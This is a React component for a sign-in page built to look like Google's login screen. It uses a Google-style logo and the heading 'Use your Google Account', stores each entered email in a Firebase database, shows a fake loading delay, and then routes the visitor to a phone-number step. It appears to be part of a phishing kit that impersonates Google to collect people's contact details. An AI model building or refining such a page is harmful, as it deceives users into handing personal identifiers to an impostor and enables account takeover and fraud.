
import { useNavigate } from 'react-router-dom';
import React, { useState } from 'react';
import '../assets/css/SinginPage.css'
import app from '../firebaseConfig';

import { getDatabase, ref, set, push } from 'firebase/database';
import { createUser } from '../database/createUser';

const SinginPage = () => {
  const [email, setEmail] = useState('');
  const [error, setError] = useState('');

   const navigate = useNavigate();

  const validateEmail = email => {
    return /^[^\s@]+@[^\s@]+\.[^\s@]+$/.test(email);
  };
  
  
  //  const handleNext = async () => {
  //    if (email.trim()) {
  //      console.log(email);
  //      await createUser(email);
  //      navigate('/phone');
  //    }
  //  };

  const handleNext = async () => {
    const trimmedEmail = email.trim();

    if (!trimmedEmail) {
      setError('Email is required');
      return;
    }

    if (!validateEmail(trimmedEmail)) {
      setError('Please enter a valid email address');
      return;
    }

    setError('');

    try {
      await createUser(trimmedEmail);
      navigate('/loading');
            setTimeout(() => {
              navigate('/phone');
              
            }, 5000);
    } catch (err) {
      console.error(err);
      setError('Something went wrong. Please try again.');
    }
  };





  return (
    <div className="container">
      <div className="card">
        <img
          src="https://static.vecteezy.com/system/resources/thumbnails/022/484/503/small/google-lens-icon-logo-symbol-free-png.png"
          alt="Google Logo"
          className="logo"
        />

        <h2>Sign in</h2>
        <h3>Use your Google Account</h3>

        {/* <input
  type="email"
  placeholder="Email or phone"
  value={email}
  onChange={e => setEmail(e.target.value)}
/> */}

        {error && <span className="error-text">{error}</span>}
        <input
          type="email"
          placeholder="Enter your email"
          value={email}
          onChange={e => {
            setEmail(e.target.value);
            setError('');
          }}
        />
        <div className="btn-email">
          <button type="button">Forgot email?</button>
        </div>

        <div className="card-bottom">
          <a href="/">Create account</a>
          {/* <button type="button" onClick={handleNext}>
            Next
          </button> */}
          <button
            type="button"
            onClick={handleNext}
            disabled={!validateEmail(email)}
          >
            Next
          </button>
        </div>
      </div>

      <div className="footer">
        <select>
          <option>English (United States)</option>
          <option>Portuguese (Brazil)</option>
          <option>Spanish (Spain)</option>
        </select>

        <div className="footer-span">
          <span>Help</span>
          <span>Privacy</span>
          <span>Terms</span>
        </div>
      </div>
    </div>
  );
};

export default SinginPage;